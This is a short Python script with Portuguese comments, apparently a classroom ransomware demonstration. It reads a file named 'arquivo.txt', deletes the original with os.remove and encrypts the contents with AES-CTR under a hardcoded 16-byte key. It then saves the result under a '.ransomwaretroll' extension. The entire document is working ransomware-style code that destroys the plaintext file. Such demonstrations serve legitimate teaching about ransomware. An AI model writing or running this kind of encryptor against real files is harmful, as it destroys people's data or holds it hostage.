import os ## importa o sistema operacional
import pyaes ## importa a biblioteca de criptografia

# abre o arquivo a ser criptografado
file_name = "arquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remove o arquivo
os.remove(file_name)

# chave de criptografia
key = b"cybersecuritydio" ## chave com 16 caracteres
aes = pyaes.AESModeOfOperationCTR(key)

# criptografa o arquivo
crypto_data = aes.encrypt(file_data)

# salva o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()